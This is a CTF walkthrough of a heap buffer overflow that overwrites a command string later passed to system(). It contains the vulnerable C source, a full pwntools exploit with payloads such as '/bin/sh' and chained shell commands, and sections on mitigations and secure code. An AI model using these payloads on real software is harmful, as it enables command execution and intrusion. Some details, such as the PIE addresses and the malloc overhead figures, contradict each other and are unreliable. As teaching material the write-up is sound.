# Input Injection 2 - CTF Walkthrough

## Challenge Overview
This is a heap-based buffer overflow challenge that exploits adjacent heap allocations to overwrite a shell command string, resulting in arbitrary command execution.

## Binary Information
```
File: vuln (ELF 64-bit LSB executable)
Architecture: x86-64
Protections:
  - PIE: Disabled (0x400000)
  - NX: Enabled
  - Stack Canary: Not found
  - Partial RELRO
  - SHSTK: Enabled
  - IBT: Enabled
```

## Source Code Analysis

```c
int main(void) {
    char* username = malloc(28);
    char* shell = malloc(28);

    printf("username at %p\n", username);
    printf("shell at %p\n", shell);

    strcpy(shell, "/bin/pwd");

    printf("Enter username: ");
    scanf("%s", username);

    printf("Hello, %s. Your shell is %s.\n", username, shell);
    system(shell);

    return 0;
}
```

## Vulnerabilities

### 1. Heap Buffer Overflow
```c
scanf("%s", username);
```
The `scanf("%s")` function reads unbounded input into the `username` buffer, which is only 28 bytes. This allows us to overflow into adjacent heap memory.

### 2. Adjacent Heap Allocations
```c
char* username = malloc(28);
char* shell = malloc(28);
```
Two consecutive `malloc()` calls typically result in adjacent heap chunks. If we overflow `username`, we can overwrite the contents of `shell`.

### 3. Command Injection via system()
```c
system(shell);
```
The program executes whatever string is in `shell` as a system command. By overwriting this string, we can execute arbitrary commands.

### 4. Information Disclosure
```c
printf("username at %p\n", username);
printf("shell at %p\n", shell);
```
The program helpfully tells us the exact addresses of both heap buffers, making exploitation trivial.

## Exploitation Strategy

1. Receive the addresses of `username` and `shell` from the program
2. Calculate the distance between them
3. Craft a payload that fills `username` with padding and overwrites `shell` with our command
4. Execute our command via `system(shell)`

## Step-by-Step Exploitation

### Step 1: Understanding Heap Layout

When the program runs:
```
[username buffer - 28 bytes] [heap metadata] [shell buffer - 28 bytes]
```

The program tells us the exact addresses:
```
username at 0x55555555a2a0
shell at 0x55555555a2c0
```

Distance: `0x55555555a2c0 - 0x55555555a2a0 = 0x20` (32 bytes)

### Step 2: Crafting the Payload

We need to:
1. Fill the first 32 bytes to reach the `shell` buffer
2. Overwrite `shell` with our desired command

For example, to read the flag:
```python
payload = b"A" * 32 + b"cat flag.txt"
```

Or more reliably (since shell distance might vary):
```python
payload = b"A" * distance + b"cat flag.txt"
```

### Step 3: Alternative Command Injection

We can use various commands:
- `cat flag.txt` - Direct file read
- `cat<flag.txt` - Shell redirection (no spaces)
- `/bin/sh` - Get a shell for interactive access
- `cat *` - Read all files in directory

The exploit uses `cat<flag.txt` to avoid issues with spaces and argument parsing.

### Step 4: Complete Exploit

```python
from pwn import *

elf = context.binary = ELF("./vuln")
context.log_level = 'debug'

p = process()

# Receive username address
p.recvuntil(b"at ")
username_addr = int(p.recvline(), 16)
log.success(f"Username address at: {hex(username_addr)}")

# Receive shell address
p.recvuntil(b"at ")
shell_addr = int(p.recvline(), 16)
log.success(f"Shell address at: {hex(shell_addr)}")

# Calculate distance
diff = shell_addr - username_addr
log.info(f"Distance between buffers: {diff} bytes")

# Craft payload: padding + command
payload = b"A" * diff + b"cat<flag.txt"

# Send payload
p.sendline(payload)

# Get output
p.interactive()
```

## Running the Exploit

```bash
python3 exploit.py
```

Expected output:
```
[+] Username address at: 0x55555555a2a0
[+] Shell address at: 0x55555555a2c0
[*] Distance between buffers: 32 bytes
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Your shell is cat<flag.txt.
CTF{your_flag_here}
```

## Understanding the Attack

### Memory Before Overflow
```
username: [empty.....................]
shell:    [/bin/pwd...................]
```

### Memory After Overflow
```
username: [AAAAAAAAAAAAAAAAAAAAAAAAAAAA]
shell:    [cat<flag.txt...............]
```

When `system(shell)` executes, it runs `cat<flag.txt` instead of `/bin/pwd`.

## Why This Works

1. **No Bounds Checking**: `scanf("%s")` doesn't check buffer size
2. **Adjacent Allocations**: Heap allocations are usually contiguous
3. **Predictable Addresses**: Program leaks exact addresses
4. **No PIE**: Addresses are consistent (though not needed here since they're leaked)
5. **Command Execution**: `system()` executes our overwritten string

## Alternative Exploitation Methods

### Method 1: Get a Shell
```python
payload = b"A" * diff + b"/bin/sh"
```
This gives you an interactive shell instead of just reading the flag.

### Method 2: Multiple Commands
```python
payload = b"A" * diff + b"cat flag.txt;ls"
```
Use semicolons to chain commands.

### Method 3: Without Address Leak
If addresses weren't leaked, we could brute-force the distance or use typical heap layout knowledge (usually 32 bytes for small allocations on 64-bit systems).

## Heap Allocation Details

On modern Linux systems with glibc:
- Small allocations (< 128 bytes) use tcache bins
- Allocation size is rounded up to include metadata
- `malloc(28)` typically allocates 32 bytes (28 + 4 byte overhead, rounded)
- Adjacent allocations are usually contiguous

For our case:
```
Requested: 28 bytes
Allocated: 32 bytes (including metadata)
Distance: Typically 32 bytes between chunks
```

## Key Concepts

1. **Heap Buffer Overflow**: Overwriting beyond allocated buffer
2. **Adjacent Memory**: Exploiting contiguous heap allocations
3. **Command Injection**: Overwriting strings passed to `system()`
4. **scanf() Dangers**: Unbounded input functions are dangerous
5. **Information Leak**: Address disclosure aids exploitation

## Defense Mechanisms

This binary has minimal protections:
- **No Stack Canary**: Not relevant (heap overflow)
- **No PIE**: Makes exploitation easier (but addresses are leaked anyway)
- **NX Enabled**: Prevents shellcode execution (but we don't need it)
- **Partial RELRO**: GOT is partially writable (not exploited here)

## Mitigation

To fix these vulnerabilities:

1. **Use Bounded Input Functions**:
   ```c
   fgets(username, 28, stdin);
   // or
   scanf("%27s", username);  // Leave room for null terminator
   ```

2. **Validate Input Length**:
   ```c
   if (strlen(input) >= buffer_size) {
       // Handle error
   }
   ```

3. **Avoid system() with User Input**:
   ```c
   // Don't allow user to control command strings
   // Use execve() with argument arrays instead
   ```

4. **Separate Heap Allocations**:
   ```c
   // Allocate from different memory regions
   // Or place guard pages between allocations
   ```

5. **Enable All Security Features**:
   - Compile with PIE: `-fPIE -pie`
   - Enable stack canaries: `-fstack-protector-all`
   - Use full RELRO: `-Wl,-z,relro,-z,now`
   - Consider Address Sanitizer during development: `-fsanitize=address`

## Secure Code Example

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char username[28];
    const char* shell = "/bin/pwd";  // Constant, not modifiable

    printf("Enter username: ");
    
    // Use fgets with size limit
    if (fgets(username, sizeof(username), stdin) == NULL) {
        return 1;
    }
    
    // Remove newline
    username[strcspn(username, "\n")] = 0;
    
    printf("Hello, %s.\n", username);
    
    // Execute fixed command, not user-controlled
    system(shell);
    
    return 0;
}
```

## Tools Used
- **pwntools**: Python exploitation framework
- **GDB**: Debugging and memory inspection
- **checksec**: Security feature identification
- **objdump/readelf**: Binary analysis

## Additional Resources
- [CWE-120: Buffer Copy without Checking Size of Input](https://cwe.mitre.org/data/definitions/120.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Heap Exploitation Techniques](https://heap-exploitation.dhavalkapil.com/)
